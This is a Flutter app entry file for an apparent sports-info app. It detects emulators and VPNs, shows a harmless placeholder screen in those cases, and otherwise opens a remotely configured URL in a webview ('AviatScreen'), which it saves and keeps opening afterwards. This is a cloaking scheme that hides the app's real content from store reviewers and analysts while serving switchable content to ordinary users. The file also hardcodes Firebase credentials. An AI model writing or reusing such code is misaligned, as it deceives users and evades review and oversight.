import 'dart:io';
import 'package:check_vpn_connection/check_vpn_connection.dart';
import 'package:device_info/device_info.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:sportinfo/firebase/firebase_remote_config_service.dart';
import 'package:sportinfo/screens/example_webview_screen.dart';
import 'package:sportinfo/screens/network_access_error_screen.dart';
import 'package:sportinfo/screens/placeholder_alert_screen.dart';
import 'package:sportinfo/screens/placeholder_list_screen.dart';
import 'package:sportinfo/shared_pref.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp(
      options: const FirebaseOptions(
    apiKey: 'AIzaSyAS5J0xC96IKvF3ST0MsJU206NchDUkMw0',
    appId: '1:840942464036:android:74c6e76883a7fa38f1fcb1',
    messagingSenderId: '840942464036 ',
    projectId: 'paaag-ff6a9',
  ));
  final firebaseRemoteConfigService = FirebaseRemoteConfigService(
      firebaseRemoteConfig: FirebaseRemoteConfig.instance);
  await firebaseRemoteConfigService.init();

  runApp(MyApp(
    firebaseRemoteConfigService: firebaseRemoteConfigService,
    isAccess: await _getAccessNetwork(),
    isEmu: await _checkIsEmu(),
    isVpn: await _vpnActive(),
    url: await _getSharedPref(),
  ));
}

_getAccessNetwork() async {
  late bool isConnection;
  try {
    final result = await InternetAddress.lookup('google.com'); //ya.ru
    if (result.isNotEmpty && result[0].rawAddress.isNotEmpty) {
      isConnection = true;
    }
  } on SocketException catch (_) {
    isConnection = false;
  }
  return isConnection;
}

_checkIsEmu() async {
  DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
  final em = await deviceInfo.androidInfo;

  var phoneModel = em.model;
  var buildProduct = em.product;
  var buildHardware = em.hardware;

  var result = (em.fingerprint.startsWith("generic") ||
      phoneModel.contains("google_sdk") ||
      phoneModel.contains("droid4x") ||
      phoneModel.contains("Emulator") ||
      phoneModel.contains("Android SDK built for x86") ||
      em.manufacturer.contains("Genymotion") ||
      buildHardware == "goldfish" ||
      buildHardware == "vbox86" ||
      buildProduct == "sdk" ||
      buildProduct == "google_sdk" ||
      buildProduct == "sdk_x86" ||
      buildProduct == "vbox86p" ||
      em.brand.contains('google')||
      em.board.toLowerCase().contains("nox") ||
      em.bootloader.toLowerCase().contains("nox") ||
      buildHardware.toLowerCase().contains("nox") ||
      !em.isPhysicalDevice ||
      buildProduct.toLowerCase().contains("nox"));

  if (result) return true;
  result = result ||
      (em.brand.startsWith("generic") && em.device.startsWith("generic"));
  if (result) return true;
  result = result || ("google_sdk" == buildProduct);
  return result;
}

_vpnActive () async{
  if (await CheckVpnConnection.isVpnActive()) {
    return true;
  }else{
    return false;
  }
}
_getSharedPref() async {
  try {
    SharedPref sharedPref = SharedPref();
    String value = await sharedPref.load();
    print(value);
    return value;
  }catch(_){
    return "";
  }
}

class MyApp extends StatelessWidget {
  MyApp(
      {super.key,
      required this.firebaseRemoteConfigService,
      required this.isAccess, required this.isEmu, required this.isVpn,
        required this.url});

  final FirebaseRemoteConfigService firebaseRemoteConfigService;
  late String target;
  final bool isAccess;
  final bool isEmu;
  final bool isVpn;
  final String url;

  // This widget is the root of your application.
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Pag',
      theme: ThemeData(
        primarySwatch: Colors.blue,
      ),
      home: _getScreen(),
      routes: {
        'PlaceholderScreen': (context) => const PlaceholderAlertScreen(),
        'error': (context) => const NetworkAccessErrorScreen(),
      },
    );
  }

  Widget _getScreen() {
    try {
      return url.isNotEmpty // check Shared Preferences URL
          ? (isAccess
              ? AviatScreen(save: url) // OPEN
              : const NetworkAccessErrorScreen()) //ERROR
          : (isAccess
              ? (isEmu
                  ? const PlaceholderListScreen() // PLACEHOLDER
                  : (!_checkUrlRemoteConfig() // check Remote Config
                      ? const PlaceholderListScreen() // PLACEHOLDER
                      : !_checkIsCheckVpn() // check Shared Preferences TO
                          ? _saveAndGet() // OPEN
                          : isVpn
                              ? const PlaceholderListScreen() // PLACEHOLDER
                              : _saveAndGet()))// OPEN
              : const NetworkAccessErrorScreen()); //ERROR
    } catch (e) {
      return const NetworkAccessErrorScreen(); //ERROR
    }
  }

  Widget _saveAndGet() {
    if (target.isNotEmpty) {
      SharedPref().save(target);
      return AviatScreen(save: target);
    } else {
      return const PlaceholderListScreen();
    }
  }

  bool _checkIsCheckVpn() {
    bool isCheckVpn = firebaseRemoteConfigService.getIsCheckVpn();
    return isCheckVpn;
  }

  bool _checkUrlRemoteConfig() {
    var urlInfo = firebaseRemoteConfigService.getUrlInfo();
    if (urlInfo.isNotEmpty && urlInfo != "") {
      target = urlInfo;
      return true;
    } else {
      return false;
    }
  }
}
